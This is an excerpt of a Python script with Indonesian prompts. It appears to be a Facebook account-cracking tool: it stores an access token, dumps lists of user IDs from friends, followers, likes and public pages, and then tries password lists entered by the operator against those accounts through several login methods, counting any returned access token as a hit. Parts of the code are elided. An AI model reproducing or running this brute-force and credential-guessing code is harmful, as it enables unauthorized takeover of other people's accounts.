...
def anonim():
    ...
    try:
        ...
        open('.log/.token.txt', 'w').write(zugendro)
        raw_input(' %s*%s tekan enter '%(O,N));(zugendro)
        hey_tayo()
    except KeyError:
...
def hey_tayo():
    os.system('clear')
    try:
    	zugendro = open('.log/.token.txt', 'r').read()
    except IOError:
        print '\n %s[%s×%s] token invalid'%(N,M,N);time.sleep(2);os.system('rm -rf .log/.token.txt');anonim()
    try:
        nama = requests.get('https://graph.facebook.com/me?access_token=%s'%(zugendro)).json()['name']
    except KeyError:
        print '\n %s[%s×%s] token invalid'%(N,M,N);time.sleep(2);os.system('rm -rf .log/.token.txt');anonim()
    ...
    print '___________________________________________________________\n';time.sleep(0.03)
    print ' [%s1%s]. Dump Friends'%(O,N);time.sleep(0.03)
    print ' [%s2%s]. Dump Public'%(O,N);time.sleep(0.03)
    print ' [%s3%s]. Dump Followers'%(O,N);time.sleep(0.03)
    print ' [%s4%s]. Dump Like'%(O,N);time.sleep(0.03)
    print ' [%s5%s]. Starting'%(O,N);time.sleep(0.03)
    print ' [%s6%s]. Check Fb'%(O,N);time.sleep(0.03)
    print ' [%s7%s]. Results'%(O,N);time.sleep(0.03)
    ...
    if tempe == '':
        ...
        print '\n'
        tod()
        time.sleep(1);os.system('rm -rf .log/.token.txt')
...
class __crack__:
    ...
    def plerr(self):
        try:
            ...
            print '\n %s[%s×%s] File [%s%s%s] Unknown!'%(N,M,N,M,self.apk,N);time.sleep(3);hey_tayo()
        ___mamank___ = raw_input(' [%s?%s] Pw Manual ? [y/t]: '%(O,N))
        if ___mamank___ in ('Y', 'y'):
            print '\n %s[%s!%s] contoh : sandi123,sandi12345,dsb.'%(N,M,N)
            while True:
                ...
                if pwek == '':
                    ...
                    print '\n %s[%s×%s] minimal 6 karakter'%(N,M,N)
                else:
                    def __yan__(ysc=None): # ycs => Hah
                        cin = raw_input('\n [*] method : ')
                        if cin == '':
                    ...
                    print ' [%s1%s]. Api (fast)'%(O,N)
                    print ' [%s2%s]. Mbasic (slow)'%(O,N)
                    print ' [%s3%s]. Mobile (super slow)'%(O,N)
                    __yan__(pwek.split(','))
                    break
    ...
    def __api__(self, user, __yan__):
        ...
        for pw in __yan__:
            ...
            if 'access_token' in response.text and 'EAAA' in response.text:
                ...
                try:
                    zugendro = open('.log/.token.txt').read()
